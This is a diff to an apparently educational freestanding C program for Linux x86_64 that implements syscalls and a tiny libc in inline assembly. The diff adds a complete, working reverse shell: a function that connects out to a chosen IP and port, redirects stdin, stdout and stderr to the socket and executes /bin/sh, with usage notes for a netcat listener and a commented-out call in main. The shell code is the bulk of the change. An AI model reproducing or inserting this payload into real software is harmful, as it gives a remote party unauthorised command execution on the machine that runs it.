@@ -1,5 +1,14 @@
-// Minimal Linux x86_64 "nolibs" syscall & libc implementation demo
-// to compile: gcc -nostdlib -nostdinc -ffreestanding -fno-builtin -fno-common -masm=intel -s -Wl,--build-id=0x31313131 -o nolibs nolibs.c
+// Minimal Linux x86_64 "nolibs" syscall & libc implementation demo with reverse shell
+// 
+// This project demonstrates:
+// - Bare metal syscall implementations using inline assembly (Intel syntax)
+// - Minimal libc function implementations (printf, memset, memcpy, memmove)
+// - Reverse shell implementation using pure inline assembly (no shellcode)
+// - All code uses Intel assembly syntax with operand numbers (%0, %1, etc.)
+// - No standard library dependencies - completely freestanding
+//
+// Compilation:
+//   gcc -nostdlib -nostdinc -ffreestanding -fno-builtin -fno-common -masm=intel -s -Wl,--build-id=0x31313131 -o nolibs nolibs.c
 
 
 // Flags explanation:
@@ -17,6 +26,12 @@
 //                          -Wl,--build-id=0x12345678 (hex value)
 //                          -o nolibs     : Output filename
 
+
+
+
+
+
+
 // System call numbers (from Linux x86-64 ABI)
 // https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md
 #define SYS_READ 0
@@ -25,11 +40,18 @@
 #define SYS_CLOSE 3
 #define SYS_NANOSLEEP 35
 #define SYS_SOCKET 41
+#define SYS_CONNECT 42
 #define SYS_ACCEPT 43
 #define SYS_RECV 45
 #define SYS_BIND 49
 #define SYS_LISTEN 50
+#define SYS_DUP2 33
+#define SYS_EXECVE 59
 #define SYS_EXIT 60
+
+
+// IMPORTANT: I prefer BSD macros, because they are more readable and easier to understand.
+
 
 // https://github.com/openbsd/src/blob/master/sys/sys/fcntl.h
 // open-only flags
@@ -52,8 +74,13 @@
 #define INT_MIN     (-0x7fffffff-1) // min value for an int
 #define INT_MAX     0x7fffffff      // max value for an int
 
-// Type definitions (no libc, so we define our own)
 
+
+
+
+
+
+// Type definitions (no libc, so we define our own)
 typedef struct timespec {
     long tv_sec;
     long tv_nsec;
@@ -71,6 +98,16 @@ struct sockaddr {
 
 
 // ================== SYSTEM CALL WRAPPERS ==================
+//
+// These functions provide a clean interface to Linux syscalls using inline assembly.
+// All syscalls use Intel syntax with operand numbers for maximum portability.
+// Each wrapper handles a different number of parameters (1-4 parameters).
+//
+// Important notes:
+// - All syscalls use "r" constraint (general register) instead of specific registers
+// - Clobber lists are essential to prevent GCC from reusing modified registers
+// - Memory clobber is included because syscalls may modify memory
+// - Return value is always in rax register after syscall
 
 static long
 syscall1(long sys_num, long a1)
@@ -193,6 +230,16 @@ syscall4(long n, long a1, long a2, long a3, long a4)
 
 
 // ================== SYSTEM CALL IMPLEMENTATIONS ==================
+//
+// High-level syscall wrapper functions that use the low-level syscall wrappers.
+// These functions provide a more convenient interface for common operations.
+// All functions use the syscall1-4 wrappers which handle the inline assembly.
+//
+// Available syscalls:
+// - File operations: open, read, write, close
+// - Socket operations: socket, bind, listen, accept, connect, recv
+// - Process operations: execve, exit, dup2
+// - Time operations: nanosleep, sleep
 
 // Exit syscall: sys_exit(int status)
 static __attribute__((noreturn)) void
@@ -277,6 +324,27 @@ sys_recv(int sockfd, void *buf, __SIZE_TYPE__ len, int flags)
     return syscall4(SYS_RECV, sockfd, (long)buf, len, flags);
 }
 
+// implement sys_connect
+static int
+sys_connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
+{
+    return syscall3(SYS_CONNECT, sockfd, (long) addr, addrlen);
+}
+
+// implement sys_dup2
+static int
+sys_dup2(int oldfd, int newfd)
+{
+    return syscall2(SYS_DUP2, oldfd, newfd);
+}
+
+// implement sys_execve
+static int
+sys_execve(const char *pathname, char *const argv[], char *const envp[])
+{
+    return syscall3(SYS_EXECVE, (long)pathname, (long)argv, (long)envp);
+}
+
 // implement sys_open
 static int
 sys_open(const char *pathname, int flags, mode_t mode)
@@ -297,7 +365,28 @@ sys_read(int fd, void *buf, __SIZE_TYPE__ len)
 
 
 
+
+
+
+
+
+
+
+
+
 // ================== LIBC IMPLEMENTATIONS ==================
+//
+// Minimal implementations of standard C library functions.
+// These are required because we compile with -nostdlib flag.
+// All functions are implemented from scratch using our syscall wrappers.
+//
+// Implemented functions:
+// - printf: Basic printf with %d, %s, %p, %% format specifiers
+// - memset: Set memory to a specific value
+// - memcpy: Copy memory (assumes non-overlapping regions)
+// - memmove: Copy memory (handles overlapping regions correctly)
+// - ft_putnbr: Print integer (used by printf for %d)
+// - ft_putptr: Print pointer in hexadecimal format (used by printf for %p)
 
 
 static void
@@ -318,6 +407,55 @@ ft_putnbr(int n)
     sys_write(1, &"0123456789"[n % 10], 1);
 }
 
+static void
+ft_putptr(void *ptr)
+{
+    // Print pointer address in hexadecimal format (e.g., 0x7fff12345678)
+    // x86_64 pointers are 64-bit, so we need 16 hexadecimal digits
+    
+    if (!ptr) {
+        // NULL pointer special case
+        sys_write(1, "(nil)", 5);
+        return;
+    }
+    
+    // Print "0x" prefix
+    sys_write(1, "0x", 2);
+    
+    // Convert pointer to unsigned long long for processing
+    unsigned long long addr = (unsigned long long)ptr;
+    
+    // Find the most significant non-zero nibble to avoid leading zeros
+    int leading_zeros = 1;
+    unsigned long long temp = addr;
+    int shift = 60;  // Start from most significant nibble (60 bits = 15 hex digits)
+    
+    // Skip leading zeros
+    while (shift >= 0 && (temp >> shift) == 0) {
+        shift -= 4;
+    }
+    
+    // If all zeros, print at least one digit
+    if (shift < 0) {
+        sys_write(1, "0", 1);
+        return;
+    }
+    
+    // Print hexadecimal digits from most significant to least significant
+    while (shift >= 0) {
+        unsigned char nibble = (unsigned char)((addr >> shift) & 0xF);
+        char hex_char;
+        
+        if (nibble < 10) {
+            hex_char = '0' + nibble;
+        } else {
+            hex_char = 'a' + (nibble - 10);
+        }
+        
+        sys_write(1, &hex_char, 1);
+        shift -= 4;
+    }
+}
 
 static int
 printf(const char *format, ...)
@@ -348,6 +486,10 @@ printf(const char *format, ...)
                     while (str[len] && len < 4096) ++len;
                     sys_write(1, str, len);
                 }
+            } else if (*format == 'p') {
+                // Get pointer argument using GCC builtin
+                void *ptr = __builtin_va_arg(ap, void *);
+                ft_putptr(ptr);
             } else if (*format == '%') {
                 // Handle %% -> print single %
                 sys_write(1, "%", 1);
@@ -429,60 +571,254 @@ memmove(void *dest, const void *src, __SIZE_TYPE__ n)
 
 
 
+// ================== REVERSE SHELL IMPLEMENTATION ==================
+//
+// This implementation uses pure inline assembly (Intel syntax) to create a reverse shell.
+// No shellcode is used - all syscalls are made directly through inline assembly.
+// The function connects to a remote host and spawns /bin/sh, redirecting I/O through the socket.
+//
+// Key features:
+// - All syscalls use inline assembly with Intel syntax
+// - Operand numbers (%0, %1, etc.) are used instead of specific register constraints
+// - Network byte order conversion using inline assembly (ror, bswap instructions)
+// - Proper error handling with printf statements
+// - File descriptor redirection using dup2 syscall
+// - Shell execution using execve syscall
+//
+// Reverse shell structure for sockaddr_in
+struct sockaddr_in {
+    unsigned short sin_family;  // AF_INET = 2
+    unsigned short sin_port;    // Port in network byte order
+    unsigned int sin_addr;      // IP address in network byte order
+    unsigned char sin_zero[8];  // Padding
+};
+
+// Reverse shell function using inline assembly
+// Connects to IP:PORT and spawns /bin/sh
+// 
+// Parameters:
+//   - ip: IP address in host byte order (e.g., 0x7f000001 for 127.0.0.1)
+//   - port: Port number in host byte order (e.g., 31337)
+//
+// Workflow:
+//   1. Convert port and IP to network byte order using inline assembly
+//   2. Create TCP socket (socket syscall)
+//   3. Connect to remote host (connect syscall)
+//   4. Redirect stdin, stdout, stderr to socket (dup2 syscall, 3 times)
+//   5. Execute /bin/sh (execve syscall)
+//
+// Note: This function never returns (noreturn attribute)
+static void __attribute__((noreturn))
+reverse_shell(unsigned int ip, unsigned short port)
+{
+    long sockfd;
+    struct sockaddr_in addr;
+    
+    // Prepare sockaddr_in structure using inline assembly
+    // Convert port to network byte order (big-endian): swap bytes
+    // https://stackoverflow.com/questions/28889971/understanding-x86-64bit-ror-shl
+    unsigned short port_net;
+    __asm__ __volatile__(
+        "ror ax, 8\n"                  // Rotate right 8 bits: swap high and low bytes
+        : "=a"(port_net)
+        : "a"(port)
+        : "memory"
+    );
+    
+    // Convert IP to network byte order (big-endian): reverse all 4 bytes
+    // https://www.felixcloutier.com/x86/bswap
+    unsigned int ip_net;
+    __asm__ __volatile__(
+        "bswap %0\n"                   // Byte swap: reverse byte order of 32-bit value
+        : "=r"(ip_net)
+        : "0"(ip)
+        : "memory"
+    );
+
+    // Initialize sockaddr_in structure
+    addr.sin_family = 2;  // AF_INET
+    addr.sin_port = port_net;
+    addr.sin_addr = ip_net;
+    
+    // Clear sin_zero using inline assembly
+    __asm__ __volatile__(
+        "xor rax, rax\n"
+        "mov QWORD PTR [%0+8], rax\n"
+        :
+        : "r"(&addr)
+        : "rax", "memory"
+    );
+
+    // Create socket using inline assembly
+    __asm__ __volatile__(
+        "mov rax, %[socket_num]\n"      // SYS_SOCKET = 41
+        "mov rdi, 2\n"                  // AF_INET
+        "mov rsi, 1\n"                  // SOCK_STREAM
+        "mov rdx, 6\n"                  // IPPROTO_TCP
+        "syscall\n"
+        "mov %[sockfd], rax\n"
+        : [sockfd] "=r"(sockfd)
+        : [socket_num] "i"(SYS_SOCKET)
+        : "rax", "rdi", "rsi", "rdx", "rcx", "r11", "memory"
+    );
+
+    if (sockfd < 0) {
+        printf("Error: failed to create socket, status: %d\n", (int) sockfd);
+        sys_exit(1);
+    }
+
+    // Connect to remote host using inline assembly
+    long connect_result;
+    __asm__ __volatile__(
+        "mov rax, %[connect_num]\n"     // SYS_CONNECT = 42
+        "mov rdi, %[sockfd]\n"
+        "mov rsi, %[addr]\n"
+        "mov rdx, 16\n"                 // sizeof(struct sockaddr_in)
+        "syscall\n"
+        "mov %[result], rax\n"
+        : [result] "=r"(connect_result)
+        : [connect_num] "i"(SYS_CONNECT), [sockfd] "r"(sockfd), [addr] "r"(&addr)
+        : "rax", "rdi", "rsi", "rdx", "rcx", "r11", "memory"
+    );
+    
+    if (connect_result < 0) {
+        printf("Error: failed to connect to remote host, status: %d\n", (int) connect_result);
+        sys_exit(1);
+    }
+    
+    // Duplicate file descriptors: stdin, stdout, stderr -> socket
+    // dup2(sockfd, 0) - stdin
+    __asm__ __volatile__(
+        "mov rax, %[dup2_num]\n"        // SYS_DUP2 = 33
+        "mov rdi, %[sockfd]\n"
+        "mov rsi, 0\n"                  // STDIN_FILENO
+        "syscall\n"
+        :
+        : [dup2_num] "i"(SYS_DUP2), [sockfd] "r"(sockfd)
+        : "rax", "rdi", "rsi", "rcx", "r11", "memory"
+    );
+    
+    // dup2(sockfd, 1) - stdout
+    __asm__ __volatile__(
+        "mov rax, %[dup2_num]\n"
+        "mov rdi, %[sockfd]\n"
+        "mov rsi, 1\n"                  // STDOUT_FILENO
+        "syscall\n"
+        :
+        : [dup2_num] "i"(SYS_DUP2), [sockfd] "r"(sockfd)
+        : "rax", "rdi", "rsi", "rcx", "r11", "memory"
+    );
+    
+    // dup2(sockfd, 2) - stderr
+    __asm__ __volatile__(
+        "mov rax, %[dup2_num]\n"
+        "mov rdi, %[sockfd]\n"
+        "mov rsi, 2\n"                  // STDERR_FILENO
+        "syscall\n"
+        :
+        : [dup2_num] "i"(SYS_DUP2), [sockfd] "r"(sockfd)
+        : "rax", "rdi", "rsi", "rcx", "r11", "memory"
+    );
+    
+    // Prepare execve arguments
+    // argv[0] = "/bin/sh"
+    // argv[1] = NULL
+    // envp = NULL
+    char *sh_path = "/bin/sh";
+    char *argv[2];
+    argv[0] = sh_path;
+    argv[1] = NULL;
+    
+    // Execute /bin/sh using inline assembly
+    __asm__ __volatile__(
+        "mov rax, %[execve_num]\n"      // SYS_EXECVE = 59
+        "mov rdi, %[path]\n"            // pathname
+        "mov rsi, %[argv]\n"            // argv
+        "mov rdx, 0\n"                  // envp = NULL
+        "syscall\n"
+        :
+        : [execve_num] "i"(SYS_EXECVE), [path] "r"(sh_path), [argv] "r"(argv)
+        : "rax", "rdi", "rsi", "rdx", "rcx", "r11", "memory"
+    );
+    
+    // Should never reach here, but just in case
+    sys_exit(1);
+}
+
+// ================== END OF REVERSE SHELL IMPLEMENTATION ==================
 
 
 
 
-// The main function
+
+
+
+
+
+
+
+
+
+
+// ================== MAIN FUNCTION ==================
+//
+// Entry point for user code. This function is called by _start after
+// proper stack alignment and argument setup.
+//
+// Currently, main() is minimal - it just returns 0.
+// To test the reverse shell, uncomment the reverse_shell() call below.
+//
 int
 main(int argc, char **argv)
 {
-    // Safety check: argc should always be at least 1, but let's be defensive
-    if (argc < 1 || !argv || !argv[0]) {
-        sys_write(STDERR_FILENO, "Error: invalid arguments\n", 25);
-        return 1;
-    }
+    // ================== REVERSE SHELL EXAMPLE ==================
+    // 
+    // To test the reverse shell functionality:
+    // 1. Start a listener in another terminal: nc -lvp 31337
+    // 2. Uncomment the line below
+    // 3. Compile and run this program
+    //
+    // Example usage:
+    //   reverse_shell(0x7f000001, 31337);  // Connect to 127.0.0.1:31337
+    //
+    // IP address format:
+    //   - 0x7f000001 = 127.0.0.1 (localhost)
+    //   - 0x0a000001 = 10.0.0.1
+    //   - IP is in host byte order, will be converted to network byte order
+    //
+    // Port format:
+    //   - 31337 (host byte order, will be converted to network byte order)
+    //
+    // What happens:
+    //   1. Creates a TCP socket (AF_INET, SOCK_STREAM, IPPROTO_TCP)
+    //   2. Connects to the specified IP:PORT
+    //   3. Redirects stdin, stdout, stderr to the socket using dup2
+    //   4. Executes /bin/sh (I/O now goes through the socket)
+    //
+    // Note: This function never returns (noreturn attribute)
+    // The program will be replaced by /bin/sh process
+    // ============================================================
+    // reverse_shell(0x7f000001, 31337);  // Uncomment to test
 
-    int len = 0;
-    while (argv[0][len]) len++;
-    sys_write(STDOUT_FILENO, "program name: ", 14);
-    sys_write(STDOUT_FILENO, argv[0], len);
-    sys_write(STDOUT_FILENO, "\n", 1);
-    sys_nanosleep(&(struct timespec){ 1, 999999999 }, NULL);
-    printf("program name: %s\n", argv[0]);
-
-    len = sys_open("test.txt", O_RDWR, 0644);
-    if (len < 0) {
-        printf("Error: failed to open file '%s', status: %d\n", "test.txt", len);
-        return 1;
-    }
-    printf("file opened successfully, status: %d\n", len);
-
-    unsigned char buffer[1024];
-    int read_len = sys_read(len, buffer, 1024);
-    if (read_len < 0) {
-        printf("Error: failed to read file '%s', status: %d\n", "test.txt", read_len);
-        return 1;
-    }
-    printf("file read successfully, status: %d\n", read_len);
-    printf("file content:\n===========================\n");
-    sys_write(STDOUT_FILENO, buffer, read_len);
-    printf("\n===========================\n");
-
-    len = sys_close(len);
-    if (len < 0) {
-        printf("Error: failed to close file '%s', status: %d\n", "test.txt", len);
-        return 1;
-    }
-    printf("file closed successfully, status: %d\n", len);
     return 0;
 }
 
-// Custom _start for no-libs setup
-// This is the real entry point of a program
-// __attribute__((naked)) is used to tell the compiler that this function is
-// is not decorated with any other function attributes
-// which means it will not have any prologue or epilogue
+// ================== PROGRAM ENTRY POINT ==================
+//
+// Custom _start function for no-libs setup.
+// This is the real entry point of the program (not main!).
+// The kernel calls _start, not main.
+//
+// __attribute__((naked)) tells the compiler:
+// - Do not generate function prologue (no push rbp, mov rbp, rsp)
+// - Do not generate function epilogue (no pop rbp, ret)
+// - We have full control over the function's assembly code
+//
+// This is necessary because:
+// - We need to set up the stack alignment manually
+// - We need to extract argc and argv from the stack
+// - We need to call main() and then sys_exit() with the return value
+//
 __attribute__((naked)) void
 _start(void)
 {
